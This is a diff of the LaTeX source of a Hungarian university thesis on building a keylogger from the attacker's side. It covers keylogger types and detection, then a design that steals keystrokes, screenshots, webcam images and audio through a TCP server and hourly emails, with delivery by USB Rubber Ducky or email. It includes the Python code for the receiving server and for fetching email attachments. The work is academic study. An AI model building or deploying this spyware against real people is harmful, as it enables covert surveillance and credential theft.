@@ -12,31 +12,66 @@
 \usepackage{setspace}
 \usepackage{indentfirst}
 \usepackage{adjustbox}
+\usepackage[normalem]{ulem}
 %\usepackage{algpseudocode}
 \usepackage{listings}
 \usepackage[left=4cm, right=3cm, top=3cm]{geometry}
 \usepackage[backend=biber]{biblatex}
 \addbibresource{references.bib}
 
-%\algnewcommand{\algorithmicand}{\textbf{ and }}
-%\algnewcommand{\algorithmicor}{\textbf{ or }}
-%\algnewcommand{\OR}{\algorithmicor}
-%\algnewcommand{\AND}{\algorithmicand}
-%\algblock[TryCatchFinally]{try}{endtry}
-%\algcblockdefx[TryCatchFinally]{TryCatchFinally}{catch}{endtry}
-%	[1]{\textbf{catch} #1}
-%	{\textbf{end try}}
 
-% pszeudo kod képek helyett
-% nem egyertemu a klines clinet stb
-% server
-% class diagram
 
+\lstdefinestyle{mypython}{	
+%	backgroundcolor=\color{white}, % choose the background color;
+	basicstyle=\fontsize{11}{11}\ttfamily,% the size of the fonts that are used for the code
+	breakatwhitespace=false, % sets if automatic breaks should only happen at whitespace
+	breaklines=true, % sets automatic line breaking
+%	commentstyle=\color{dkgreen},  % comment style
+%	deletekeywords={...},  % if you want to delete keywords from the given language
+%	escapeinside={\%*}{*)},  % if you want to add LaTeX within your code
+	extendedchars=true,  % lets you use non-ASCII characters; for 8-bits encodings only, does not work with UTF-8
+	frame=none,	 	 % adds a frame around the code
+	keepspaces=true, % keeps spaces in text, useful for keeping indentation of code (possibly needs columns=flexible)
+%	keywordstyle=\color{blue}\bfseries, % keyword style
+	language=Python, % the language of the code (can be overrided per snippet)
+%	otherkeywords={*,}, % if you want to add more keywords to the set
+	numbers=none,  % where to put the line-numbers; possible values are (none, left, right)
+	numbersep=5pt, % how far the line-numbers are from the code
+%	numberstyle=\tiny\color{gray}, % the style that is used for the line-numbers
+%	rulecolor=\color{black}, % if not set, the frame-color may be changed on line-breaks within not-black text (e.g. comments (green here))
+	showspaces=false,% show spaces everywhere adding particular underscores; it overrides 'showstringspaces'
+	showstringspaces=false,  % underline spaces within strings only
+	showtabs=false,  % show tabs within strings adding particular underscores
+	%stepnumber=1,  % the step between two line-numbers. If it's 1, each line will be numbered
+%	stringstyle=\color{mauve}, % string literal style
+	tabsize=2,
+	columns=fullflexible  % Using fixed column width (for e.g. nice alignment)
+	morecomment = [l]{\#},
+	morecomment = [s]{'''}{'''},
+	morestring=[b]{",'}, 
+	sensitive = true,
+	morekeywords={abstract, event, new, struct,
+		as, explicit, None,
+		base, extern, object, self,
+		bool, False, raise,
+		break, finally, True,
+		byte, Override, try,
+		float, for, uint,
+		char, foreach,
+		class, if,
+		continue, in, return,
+		decimal, int, sbyte,
+		do, is, while,
+		double, else, instanceof,
+		def}
+}
+
+\lstset{style=mypython}
 
 \begin{document} 
 % title page (ro)
 \begin{titlepage}
-\rule[20pt]{\textwidth}{1pt}
+\noindent \rule[20pt]{\textwidth}{1pt}
 \begin{centering}
 \vspace{4pt}
 {\fontsize{18pt}{1} \textbf{UNIVERSITATEA SAPIENTIA DIN CLUJ-NAPOCA}}\\ \vspace{4pt}
@@ -120,7 +155,10 @@ Facultatea de Științe Tehnice și Umaniste din Târgu Mureș\\[5pt]
 
 % Declaratie tip a.
 \begin{titlepage}
-\rule[10pt]{\textwidth}{1pt}
+\hyphenchar\font=-1
+\sloppy
+
+\noindent \rule[10pt]{\textwidth}{1pt}
 \begin{flushright}
 {\fontsize{12pt}{1} \textbf{Model tip a.}}
 \end{flushright}
@@ -132,7 +170,7 @@ Facultatea de Științe Tehnice și Umaniste din Târgu Mureș\\[5pt]
 
 \vspace{4em}
 \doublespacing
-\justify{\large Subsemnata/ul ............................................................., absolvent(ă) al/a \\specializării …………………………, promoţia………… cunoscând prevederile Legii Educaţiei Naţionale 1/2011 şi a Codului de etică şi deontologie profesională a Universităţii Sapientia cu privire la furt intelectual declar pe propria răspundere că prezenta lucrare de licenţă/proiect de diplomă/disertaţie se bazează pe activitatea personală, cercetarea/proiectarea este efectuată de mine, informaţiile şi datele preluate din literatura de specialitate sunt citate în mod corespunzător.}
+\large Subsemnata/ul \dotuline{FELMERI ZSOLT}, absolvent(ă) al/a specializării \dotuline{INFORMATICĂ}, promoţia \dotuline{2021} cunoscând prevederile Legii Educaţiei Naţionale 1/2011 şi a Codului de etică şi deontologie profesională a Universităţii Sapientia cu privire la furt intelectual declar pe propria răspundere că prezenta lucrare de licenţă/proiect de diplomă/disertaţie se bazează pe activitatea personală, cercetarea/proiectarea este efectuată de mine, informaţiile şi datele preluate din literatura de specialitate sunt citate în mod corespunzător.
 
 \vspace{15em}
 \begin{flushleft}
@@ -149,7 +187,10 @@ Semnătura…………………}
 
 % Declaratie tip b.
 \begin{titlepage}
-\rule[10pt]{\textwidth}{1pt}
+\hyphenchar\font=-1
+\sloppy
+
+\noindent \rule[10pt]{\textwidth}{1pt}
 \begin{flushright}
 {\fontsize{12pt}{1} \textbf{Model tip b.}}
 \end{flushright}
@@ -161,8 +202,9 @@ Semnătura…………………}
 
 \vspace{4em}
 \doublespacing
-\justify{\large Subsemnata/Subsemnatul ..........................................., funcţia………………, titlul ştiinţific………………… declar pe propria răspundere că\\ ........................................., absolvent al specializării ............................ a întocmit prezenta lucrare sub îndrumarea mea.
-\par În urma verificării formei finale constat că lucrarea de licenţă/proiectul de\\ diplomă/disertaţia corespunde cerințelor de formă şi conținut aprobate de Consiliul Facultăţii de Științe Tehnice și Umaniste din Târgu Mureș în baza reglementărilor Universităţii Sapientia. Luând în considerare şi Raportul generat din aplicaţia antiplagiat ''Turnitin'' consider că sunt îndeplinite cerințele referitoare la originalitatea lucrării impuse de Legea educației naționale nr. 1/2011 şi de Codul de etică şi deontologie profesională a Universităţii Sapientia, şi ca atare sunt de acord cu prezentarea şi susținerea lucrării în fața comisiei de examen de licență/diplomă/disertaţie.}
+
+\large Subsemnata/Subsemnatul ......................................................., funcţia ……………, titlul ştiinţific ………………… declar pe propria răspundere că ........................................., absolvent al specializării ............................ a întocmit prezenta lucrare sub îndrumarea mea.
+\par În urma verificării formei finale constat că lucrarea de licenţă/proiectul de diplomă/disertaţia corespunde cerințelor de formă şi conținut aprobate de Consiliul Facultăţii de Științe Tehnice și Umaniste din Târgu Mureș în baza reglementărilor Universităţii Sapientia. Luând în considerare şi Raportul generat din aplicaţia antiplagiat ''Turnitin'' consider că sunt îndeplinite cerințele referitoare la originalitatea lucrării impuse de Legea educației naționale nr. 1/2011 şi de Codul de etică şi deontologie profesională a Universităţii Sapientia, şi ca atare sunt de acord cu prezentarea şi susținerea lucrării în fața comisiei de examen de licență/diplomă/disertaţie.
 
 \vspace{5em}
 \begin{flushleft}
@@ -178,23 +220,25 @@ Data:}
 
 % Turnitin similarity report
 \begin{titlepage}
-\rule[10pt]{\textwidth}{1pt}
+\noindent \rule[10pt]{\textwidth}{1pt}
 \end{titlepage}
 
 % table of contents
-\rule[10pt]{\textwidth}{1pt}
+\noindent \rule[10pt]{\textwidth}{1pt}
 \renewcommand{\contentsname}{Tartalomjegyzék}
 \tableofcontents
 \thispagestyle{empty}
 \cleardoublepage
 
 % table of figures
+\noindent \rule[10pt]{\textwidth}{1pt}
 \renewcommand{\listfigurename}{Ábrák jegyzéke}
 \listoffigures
 \thispagestyle{empty}
 \cleardoublepage
 
 % table of tables
+\noindent \rule[10pt]{\textwidth}{1pt}
 \renewcommand{\listtablename}{Táblázatok jegyzéke}
 \listoftables
 \thispagestyle{empty}
@@ -204,12 +248,19 @@ Data:}
 \setcounter{page}{1}
 \setlength{\parindent}{0.5cm}
 
+\hyphenchar\font=-1
+\sloppy
+%\tolerance=1
+%\emergencystretch=\maxdimen
+%\hyphenpenalty=10000
+%\hbadness=10000
+
 \section{Bevezető}\label{sec:intro}
-A keylogger egy olyan szoftver vagy hardver, amely a számítógéphez csatlakoztatott billentyűzet naplózására használandó. A dolgozatban a legnagyobb szerepben a szoftver alapú keylogger részesül. Ugyanakkor, a szoftver kivitelezésénél a támadó szemszöge kerül előtérbe, akinek az a célja, hogy adatokat feltünésmentesen tudjon eltulajdonítani.
+Világunk egyre inkább a digitalizálódás fele halad. Ennek következtében már a legtöbb embernek birtokában van legalább egy számítógép, ami lehet hordozható laptop vagy asztali gép. Mivel az emberek 2021-ben rendelkeznek digitális ujjlenyomattal, ezért az adatok bisztonsága előtérbe kerül. Egy ilyen eszköz, amely az adatokkal dolgozik, a keylogger. A keylogger egy olyan szoftver vagy hardver, amely a számítógéphez csatlakoztatott billentyűzet naplózására használandó. A dolgozatban a legnagyobb szerepben a szoftver alapú keylogger részesül. Ugyanakkor, a szoftver kivitelezésénél a támadó szemszöge kerül előtérbe, akinek az a célja, hogy adatokat feltünésmentesen tudjon eltulajdonítani.
 
-A keyloggereknek van jó, illetve rossz oldaluk is. Rosszhírük a filmvilágnak köszönhetően terjedt el rohamosabban, ugyanis a filmekben az úgynevezett hacker használ ilyen és ehez hasonló eszközöket. A mindennapi életből vehetjük akár egy gyanakodó férj vagy feleség példáját. Akár a féltékenység szüleményeként létrejött keylogger segíthet annak a felderítlslben, hogy a másik fél kivel kommunikál és akár az egész írásbeli beszélgetés nyomon követhető. A fennebb megadott példák, helyzetek a rossz használati utakról szólnak, viszont egy sokkal helyénvalóbb módja a használatának cégeken belül mutatkozik meg. A cégek esetében, ha hiba keletkezik ellenőrizni lehet, hogy mi is a kiváltó ok, azáltal, hogy nyomon tudják követni az alkalmazottaik számítógép használatát az irodában.
+A keyloggereknek van jó, illetve rossz oldaluk is. Rosszhírük a filmvilágnak köszönhetően terjedt el rohamosabban, ugyanis a filmekben az úgynevezett hacker használ ilyen és ehez hasonló eszközöket. A mindennapi életből vehetjük akár egy gyanakodó férj vagy feleség példáját. Akár a féltékenység szüleményeként létrejött keylogger segíthet annak a felderítésében, hogy a másik fél kivel kommunikál és akár az egész írásbeli beszélgetés nyomon követhető. A fennebb megadott példák, helyzetek a rossz használati utakról szólnak, viszont egy sokkal helyénvalóbb módja a használatának cégeken belül mutatkozik meg. A cégek esetében, ha hiba keletkezik ellenőrizni lehet, hogy mi is a kiváltó ok, azáltal, hogy nyomon tudják követni az alkalmazottaik számítógép használatát az irodában.
 
-Az első keylogger hardver alapú volt, amit a Szovjet Únió fejlesztett ki a 1970-es évek közepén írógépeket célozva. Megmérte az IBM Selectric írógépek nyomtatófejé-nek mozgását a regionális mágneses mezőre gyakorolt finom hatásokon keresztül, amelyeket a nyomtatófej forgása és mozgásai okoztak. Egy korai keyloggert Perry Kivolowitz írt, és 1983 november 17-én tette közzé az Usenet net.unix-wizards, net.sources. A felhasználói módú program a karakterlisták (kliensek) felkutatásával és kiírásával működött, ahogyan a Unix kernelbe beállították. Az 1970-es években a kémek keyloggereket telepítettek az amerikai nagykövetség és a moszkvai konzulátus épületébe, kihasználva a Selectric II és a Selectric III elektomos írógépek hibáit. A szovjet nagykövetségek elektromos írógépek helyett kézi írógépeket használtak bizalmas információkhoz, nyilván azért, mert nem sebezhetőek az ilyen támadásokkal szemben. 2013-tól az orosz különleges szolgálatok még mindig írógépeket használ-nak.
+Az első keylogger hardver alapú volt, amit a Szovjet Únió fejlesztett ki a 1970-es évek közepén írógépeket célozva. Megmérte az IBM Selectric írógépek nyomtatófejének mozgását a regionális mágneses mezőre gyakorolt finom hatásokon keresztül, amelyeket a nyomtatófej forgása és mozgásai okoztak. Egy korai keyloggert Perry Kivolowitz írt, és 1983 november 17-én tette közzé az Usenet net.unix-wizards, net.sources. A felhasználói módú program a karakterlisták (kliensek) felkutatásával és kiírásával működött, ahogyan a Unix kernelbe beállították. Az 1970-es években a kémek keyloggereket telepítettek az amerikai nagykövetség és a moszkvai konzulátus épületébe, kihasználva a Selectric II és a Selectric III elektomos írógépek hibáit. A szovjet nagykövetségek elektromos írógépek helyett kézi írógépeket használtak bizalmas információkhoz, nyilván azért, mert nem sebezhetőek az ilyen támadásokkal szemben. 2013-tól az orosz különleges szolgálatok még mindig írógépeket használnak.
 
 Az ellenintézkedések hatékonysága változó, mivel a keyloggerek különböző technikákat alkalmaznak az adatok rögzítésére. Így az ellenintészkedéseknek hatékonynak kell lenniük az adott adatrögzítési technikával szemben is. A grafikus felhasználói felülettel rendelkező operációs rendszereken használható a képernyőn megjelenő billentyűzet. Ez hatékony a hardveres keyloggerek ellen, ugyanis egyértelmű módon nem kerül sor a hagymányos billentyűzet használatára.
 
@@ -217,40 +268,56 @@ A következő fejezetben részletes bemutatásra kerülnek a keyloggerek tipusai
 
 \subsection{Célkitűzés}
 %bullet formatum
-Célom az volt, hogy egy támadó szerepkörébe képzeljem magam, ez által jobban megismerkedni egy támadó gondolatmenetével, hogy a későbbiekben fel tudjam használni ezt a tudást nagyobb rendszerek védelme érdekében.
+%Célom az volt, hogy egy támadó szerepkörébe képzeljem magam, ez által jobban megismerkedni egy támadó gondolatmenetével, hogy a későbbiekben fel tudjam használni ezt a tudást nagyobb rendszerek védelme érdekében.
 
 \section{Elméleti megalapozás és bibliográfiai tanulmány (a téma pontos körülhatárolása érdekében végzett dokumentálódás)}\label{sec:bibl}
-%mi az a keylogger
-%mi a problema, mit akar megoldani
-%kell definialni az adatot
-%elkuldes
-%kategorizalas
-
 \subsection{Definíció}
-\parencite{ahmed2014survey} A keyloggerek egyfajta rosszindulatú szoftverek, amelyek rögzítik a billentyűzet billentyűleütéseit, és naplófájlba mentik azokat. Ennek következtében \ képesek érzékeny információk, például felhasználónév, PIN-kód és jelszó elfogására. A rosszindulatú programoknak számos nevük van az angol nyelvben, például: ``malicious code (MC)'', ``malicious software'', ``malware'' és ``malcode''.
+\parencite{ahmed2014survey} A keyloggerek egyfajta szoftverek, amelyek rögzítik a billentyűzet billentyűleütéseit, és naplófájlba mentik azokat. Rosszindulatúsága abból fakad, hogy egy harmadik félnek eljuttatja a naplófájlba elmentett adatokat. Ennek következtében képesek érzékeny információk, például felhasználónév, PIN-kód és jelszó elfogására.  A rosszindulatú programoknak számos nevük van az angol nyelvben, például: ``malicious code (MC)'', ``malicious software'', ``malware'' és ``malcode''.
 
 Numerous, McGraw és Morrisett a következő képpen definiálták a rosszindulatú kódot: \cite{ahmed2014survey} ``bármely kód, amelyet hozzáadtak, megváltoztattak vagy eltávolítottak egy szoftverrendszerből annak érdekében, hogy szándékozan kárt okozzanak vagy felforgassák a rendszer tervezett funkcióját.''
+
+%target pc
+%usecase dia -> infect pc - use pc - report
+Ahoz, hogy tovább lehessen lépni, definiálni kell a támadót és az éldozatot. A támadó az a személy, aki eljuttatja a rosszindulatú szoftvert az áldozat számítógépére. Ez megtörténhet különböző eszközökkel, mint például e-mail vagy USB. Az áldozatnak nincs egyéb dolga mint, hogy használja a saját gépét, ezzel kapcsolatot létesítve a támadóval. A Figure \ref{fig:infectpcdia}-en látható a támadási fázis, és a Figure \ref{fig:chartransferdia} tartalmazza az áldozat számítógéppel való interakcióját, és ezt hogyan látja a támadó.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/infectpc\ diagram2}
+\caption{Támadási fázis}
+\label{fig:infectpcdia}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=400pt]{../images/character\ transfer\ diagram}
+\caption{Karakterek elküldése}
+\label{fig:chartransferdia}
+\end{figure}
 
 \subsection{Keylogger típusok}
 Operációs rendszer szintjén két féle keylogger létezik: magas szintű és alacsony szintű (high-level and low-level) \cite{wood2010keyloggers}. A magas szintű keyloggerek az operációs rendszer felhasználói módjában hajtódnak végre, ezek a felhasználói mód horgainak variációival valósulnak meg. Windows operációs rendszeren a felhasználó billentyű-leütéses eseményeit egy olyan üzenetkezelő mechanizmus jelöli, amely a billentyűzet-ről átadja az adatokat annak az ablaknak, amely válaszol a billentyűleütésre. Ez az üzenetmechanizmus összekapcsolható, hogy a támadónak hozzáférést biztosítson a billentyűleütésekhez még azelőtt. hogy elérnék az alkalmazást. A kontextustól függően a kifejlesztett keylogger globális vagy lokális horgot valósíthat meg a billentyűleütések eseményeinek lekérésére. A globális horgok az egész rendszerre kiterjedő üzeneteket, míg a lokális horgok az alkalmazás specifikus üzeneteket figyelik. Ezekkel az összekapcsolt üzenetekkel a támadó elolvashatja a beírt billentyűleütéseket, módosíthatja azok adatait, sőt teljesen megszakíthatja az üzenetáramlást. Azonban általában a keyloggerek csak a billentyűleütés adatait olvassák és továbbítják az üzenetet a lánc következő tagjának.
 
 Az alacsony, kernel szintű keyloggerek általában ``rootware''-ként valósulnak meg \cite{butler2006r2}, ``rootkit'' és ``spyware'' kombinációjaként. A rootkit egy olyan program vagy eszközkészlet, amely titokban fut egy fertőzött gépen annak érdekében, hogy hosszú távú, észrevétlen hozzáférést biztosítson a rendszer gyökeréhez a támadó számára. Az elrejtettség általában kiemelt fontosságu a rootkit számára, mivel célja az operációs rendszer magjának (kernel) állandó módosítása. A spyware olyan szoftver, amely felhaszálói adatokat gyűjt az áldozat beleegyezése nélkül. Ezt a két kifejezést használva a rootware keyloggerek olyan rejtett szoftverek, amelyek bekapcsolódnak a létfontosságú rendszer szokásos munkameneteljébe, hogy összegyűjtsék és továbbítsák a felhasználói billentyűleütéseket az áldozat tudta és beleegyezése nélkül.
 
-A keyloggerek négy fő kategóriára oszthatók: hardware, acoustic, wireless és software \cite{ahmed2014survey}. Bár ezeknek különvöző a használati módjuk és az információ szerzési módszereik, egy közös dolgon osztoznak: lementik az ellopott információt és adatot egy log állományba.
+A keyloggerek négy fő kategóriára oszthatók: hardver, wireless, akusztikus és szoftver \cite{ahmed2014survey}. Bár ezeknek különböző a használati módjuk és az információ szerzési módszereik, egy közös dolgon osztoznak: lementik az ellopott információt vagy adatot egy log állományba.
 
+%hardveres
 \subsubsection{Wireless keylogger}
 \cite{ahmed2014survey} A wireless keylogger kihasználja a Bluetooth interfészeket, hogy a rögzített adatokat 100 méteres körzetben továbbítsa. Elsődleges célja az átvitt csomagok lehallgatása wireless billentyűzetről. Hátránya, hogy szükséges egy fogadó/antenna relatív közel a célpont munkakörnyékéhez.
 
-\subsubsection{Hardware keylogger}
-\cite{ahmed2014survey} A hardware keylogger egy olyan fizikai eszköz, amely a billentyűzet és a számítógép között helyezkedik el. Kétféle csatlakozási módszer létezik: a keyloggerek közvetlenül összekapcsolhatók a billentyűzet és a számítógép között. A második módszer nem fizikai kapcsolatot igényel a számítógéppel, hanem a keylogger áramkör telepítését a billentyűzetbe. Ennek a módszernek az az előnye, hogy a felhasználók nem figyelhetik fizikailag a keylogger-t.
+\subsubsection{Hardver keylogger}
+\cite{ahmed2014survey} A hardver keylogger egy olyan fizikai eszköz, amely a billentyűzet és a számítógép között helyezkedik el. Kétféle csatlakozási módszer létezik: a keyloggerek közvetlenül összekapcsolhatók a billentyűzet és a számítógép között. A második módszer nem igényel fizikai kapcsolatot a számítógéppel, hanem egy keylogger áramkör telepítését igényli a billentyűzetbe. Ennek a módszernek az az előnye, hogy a felhasználók nem figyelhetik fizikailag a keyloggert.
 
-\subsubsection{Software keylogger}
-\cite{ahmed2014survey} A software keylogger elfogja a billentyűzet és az operációs rendszer mentén haladó adatokat. Gyűjti a billentyű karaktereit egy állományba, majd továbbítja a támadónak, aki telepítette a keylogger-t.
+\subsubsection{Szoftver keylogger}
+\cite{ahmed2014survey} A szoftver keylogger elfogja a billentyűzet és az operációs rendszer mentén haladó adatokat. Gyűjti a billentyű karaktereit egy állományba, majd továbbítja a támadónak, aki telepítette a keyloggert.
 
-\subsubsection{Acoustic keylogger}
+%harveres
+\subsubsection{Akusztikus keylogger}
 \cite{ahmed2014survey} A hardware keylogger-rel ellentétben az acoustic keylogger elemzésekor rögzíti az egyes billentyűleütések hangját. Különleges felszerelés szükséges a felhasználó gépelés hangjának meghallgatásához. Parabolikus mikrofonokat használnak nagy távolság alapuló rögzítésre, ezért ezt a mikrofont arra használják, hogy a billentyűzet hangját 30 méter távolságból vegye fel a célzott helyről.
 
 \subsection{Anti keylogger}
+%osszekoto mondat
+%ha vannak keyloggerek akkor szukseg van 
 \cite{wood2010keyloggers} A rosszindulatú programok észlelését gyakran satikusan vagy dinamikusan nézik. A statikus észlelés magába foglalja az aláírás alapú mintázatfelismerést, míg a dinamikus észlelés viselkedésbeli és működési alapú megfigyelést jelent. A statikus felismeréshez rosszindulatú programok észlelésére van szükség a rendszer figyelése érdekében, hogy a felismerhető rosszindulatú aláírásokat vagy `checksum'-okat kiszűrje. Ezek az aláírások lényegében oszlyan gépi utasítások szekvenciái, amelyek megfelelnek a program által a gazdagépen végrehajtott gyanús tevékenységnek. Két jelentős probléma merül fel ezzel a technikával:
 \begin{itemize}
 \item a rosszindulatú programfelismerőt folyamatosan frissíteni kell az új rosszindulatú programokkal
@@ -258,12 +325,13 @@ A keyloggerek négy fő kategóriára oszthatók: hardware, acoustic, wireless �
 \end{itemize}
 Az utóbbi a rosszindulatú keyloggerekre erősen vonatkozik, mivel nincs egyedi aláírásuk. Ezért dinamikus detektálási technikákat kell alkalmazni a rosszindulatú keyloggerek észlelésére.
 
-\subsubsection{Aláírás alapú keylogger}
+\subsubsection{Aláírás alapú anti keylogger}
 \cite{tuli2013system} Ezek olyan alkalmazások, amelyek a telepített fájlok vagy DLL-ek, valamint az általa készített beállításjegyzék alapján azonosítják a keyloggereket. Bár sikeresen azonosítja az ismert keyloggereket, nem tudja azonosítani azokat a keyloggereket, amelyeknek aláírása nincs tárolva az adatbázisban.A virusirtó szoftverek többsége ezen a megközelítésen alapuló eljárást alkalmazzák.
 
-\subsubsection{Horog alapú keylogger}
+\subsubsection{Horog alapú anti keylogger}
 \cite{tuli2013system} A windows rendszereken egy horog folyamat a $SetWindowsHookEx$ függvényt használja, ugyanazokat a funkciókat, mint a horog alapú keyloggerek. Ezt arra használják, hogy figyelemmel kísérjék a rendszer bizonyos típusú eseményeit, például billentyűleütés vagy egérkattintás. Azonban a horog alapú anti keyloggerek blokkolják a vezérlés ezen átadását egyik horog eljárásról a másikra. Ennek eredményekét a keylogger szoftver nem generál naplózást a billentyűleütés elfogásakor. Bár a horog alapú anti keyloggerek jobbak mint az aláírás alapú anti keyloggerek, de ezek továbbra sem képesek megállítani minden keyloggert.
 
+\cleardoublepage
 \section{A rendszer specifikációi és architektúrája (szoftverek és hardverek esetében)}\label{sec:specs_and_arch}
 %virtualis gepek -> meresek, hany kliensd bir el
 %kiserletek, grafikonok
@@ -298,7 +366,6 @@ A python 3.x verzióhoz szükséges modulok a futtatáshoz:
 \item http.server
 \end{itemize}
 \end{multicols}
-\cleardoublepage
 A \textbf{pynput} modul a billentyűzet és az egér eseménykezelését teszi lehetővé. Egy régebbi verzióját kell használni ($1.6.8$), mert a legújabb ($1.7.2$) nem kompatibilis a fordító programokkal.
 
 A \textbf{pyautogui} modullal képernyőképet lehet készíteni, és azt elmenti egy fájlba a rendszeren. A végrehajtásához szükséges, hogy a felhasznéló képernyőképet tudjon készíteni önmagénak.
@@ -339,8 +406,7 @@ A Figure \ref{fig:classdia}-en látható az osztályok és az elhatárolt kompon
 
 A \textbf{Server} és a \textbf{Client} osztályok hozzák létre a kapcsolatot, ennek a feltétele, hogy a szerver hamarabb el kell legyen indítva mint a kliens. A kapcsolat létesítése után elindul mindkét komponensnél a keylogger, amely szükséges, hogy az információt elküldje és fogadja. A szerfer komponens fogja fogadni azt amit a kliens komponens küld, és azt egy log állományba írja. Az információ a szervernél tartalmazza a billentyű karaktereit, a képernyőképet, a webkamera képet és a hangfelvételt. A karakterek kivételével a többi opciót a \textbf{MenuHandler} osztály fogja igazítani. A szerver küld a kliensnek egy opciót, amely lehet kepernyőkép, webkamerakép vagy hangfelvétel, ezt a kliens komponens \textbf{MenuHandlerClient} osztály fogadja és megpróbálja végrehajtani a feladatot. Ha sikerül elküldi a szervernek, ha nem, akkor egy hibaüzenetet küld, vagy megszakítsa a kapcsolatot. A kapcsolat megszakítésa után a kliens e-mail-t küld oránként, amelyben az addig lementett karakterek és egy képernyőkép van csatolmányként. Mindkét komponensnél a menüt kezlelő osztályok külön szálon kell fussanak, hogy ne blokkolják a fő szálat. Ez által megoldva, hogy párhuzamosan a karakter küldéssel lehet küldeni a többi adatot is.
 
-Szükséges egy szköz, amely segítségével a futtatható fájlt el lehet juttatni a célpont számítógépére. A megfertőzés látható a lenti Figure \ref{fig:infectpcdia}-n.
-Lehetséges eszközök a kivitelezésre:
+Szükséges egy eszköz, amely segítségével a futtatható fájlt el lehet juttatni a célpont számítógépére. Lehetséges eszközök a kivitelezésre:
 \begin{itemize}
 \item USB Rubber Ducky
 \item Elküldeni egy e-mail formában
@@ -349,22 +415,6 @@ A USB Rubber Ducky egy olyan usb eszköz, amely segítségével, a számítógé
 %\begin{algorithmic}[H]
 %\State $python3\ -m\ http.server\ <port>$
 %\end{algorithmic}
-
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/infectpc\ diagram}
-\caption{hacker infects target's PC}
-\label{fig:infectpcdia}
-\end{figure}
-
-A Figure \ref{fig:chartransferdia} tartalmazza a célpont billentyűzettel való kapcsolatát, és ezt hogyan látja a támadó.
-
-\begin{figure}[H]
-\centering
-\includegraphics[width=400pt]{../images/character\ transfer\ diagram}
-\caption{Character transfer diagram}
-\label{fig:chartransferdia}
-\end{figure}
 
 \section{A részletes tervezés}\label{sec:plan}
 
@@ -396,13 +446,13 @@ Itt megkellett tervezni egy protokollt, ami a kommunikáció alapja. A protokoll
 \hline
 \textbf{type} & \textbf{time} & \textbf{information} \\
 \hline
-4-5 & 11 & ? \\
+5 & 11 & ? \\
 \hline
 \end{tabular}
 \end{table}
 A $type$ mező megmondja, hogy milyen típusu adat fog jönni az $information$ mezőben. Ez 4 vagy 5 bájt lehet. Előfodulható lehetőségek:
 \begin{itemize}
-\item char - egy karakter
+\item chars - egy karakter
 \item image - egy képernyőkép bájtsorozata
 \item wcpic - egy webkamera kép bájtsorozata
 \item audio - egy audio állomány bájtsorozata
@@ -413,34 +463,34 @@ Az $information$ mezőben vannak azok az adatok amelyeket a szerver fel kell dol
 A továbbiakban az adatok feldolgozásra kerülnek, ha a TCP kapcsolat még nem zárult be. Az adatok beíródnak egy-egy állományba. Ha az $infomation$ mezőben az ``Error'' szöveg érkezik, akkor sikertelen volt az adatküldés, és a program egy üzenetet ír ki a vezérlőablakra, hogy tudassa a sikertelen folyamatot. A $data$ változó tartalmazza a protokoll által található információt.
 \begin{lstlisting}[language=Python]
 if data[0] == "image":
-    if data[2] == 'Error':
-        logger.info("Error with taking screenshot!")
-    else:
-        with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
-            handler.write(data[2])
-        logger.info('Done')
+	if data[2] == 'Error':
+		logger.info("Error with taking screenshot!")
+	else:
+		with open(f'./screenshot_{data[1]}.png', 'wb') as handler:
+			handler.write(data[2])
+		logger.info('Done')
 elif data[0] == "char":
-    write_file(os.path.join(path, filename), data[1:])
-    if gui_running:
-        self.gui.insert_data(data[1:])
+	write_file(os.path.join(path, filename), data[1:])
+	if gui_running:
+		self.gui.insert_data(data[1:])
 elif data[0] == "wcpic":
-    if data[2] == 'Error':
-        logger.info("Error with taking webcam picture!")
-    else:
-        with open(f'./webcam_{data[1]}.png', 'wb') as handler:
-            handler.write(data[2])
-        logger.info('Done')
+	if data[2] == 'Error':
+		logger.info("Error with taking webcam picture!")
+	else:
+		with open(f'./webcam_{data[1]}.png', 'wb') as handler:
+			handler.write(data[2])
+		logger.info('Done')
 elif data[0] == 'audio':
-    if data[2] == 'Error':
-        logger.info("Error with recording audio!")
-    else:
-        with open(f'./audio_{data[1]}.wav', 'wb') as handler:
-            handler.write(data[2])
-        logger.info('Done')
+	if data[2] == 'Error':
+		logger.info("Error with recording audio!")
+	else:
+		with open(f'./audio_{data[1]}.wav', 'wb') as handler:
+			handler.write(data[2])
+		logger.info('Done')
 elif data[0] == 'close':
-    self.connection.client.close()
-    logger.info("Connection closed!\n")
-    break
+	self.connection.client.close()
+	logger.info("Connection closed!\n")
+	break
 \end{lstlisting}
 
 Ha a TCP kapcsolat felbomlik, akkor e-mail-en keresztül lesz továbbítva az adat csatolmányban. Ahoz, hogy írni és olvasni is tudjunk e-mail-t python kódból, a google fióknál be kell legyen kapcsolva a ``Less secure app access''. A gmail fióknál pedig a következőt kell engedélyezni: Settings $\rightarrow$ See all settings $\rightarrow$ Forwarding and POP/IMAP $\rightarrow$ IMAP access $\rightarrow$ Enable IMAP.
@@ -450,16 +500,16 @@ Előszőr csatlakozni kell a megadott gmail címhez. Ez után megnézzük, hogy 
 A $get\_attachments$ függvény segítségével tölti le a csatolmányokat, amelynek egy paramétere van: az üzenet. Az üzenet tartalmazza a teljes üzenetet bájtokban, tehát, hogy kiől jött az üzenet, kinek küldték, a téma, maga az üzenet törzse, a csatolmányok. A függvény ezen az üzeneten megy végig és ha talal csatolmányt azt letölti, más szóval megnyit egy állományt binárisan és beleírja a tartalmát.
 \begin{lstlisting}[language=Python]
 def get_attachments(self, msg):
-    for part in msg.walk():
-    if part.get_content_maintype() == 'multipart':
-        continue
-    if part.get('Content-Disposition') is None:
-        continue
+	for part in msg.walk():
+	if part.get_content_maintype() == 'multipart':
+		continue
+	if part.get('Content-Disposition') is None:
+		continue
 
-    filename = part.get_filename()
-    if bool(filename):
-    with open(os.path.join(temp_path, filename), "wb") as handler:
-        handler.write(part.get_payload(decode=True))
+	filename = part.get_filename()
+	if bool(filename):
+		with open(os.path.join(temp_path, filename), "wb") as handler:
+			handler.write(part.get_payload(decode=True))
 \end{lstlisting}
 
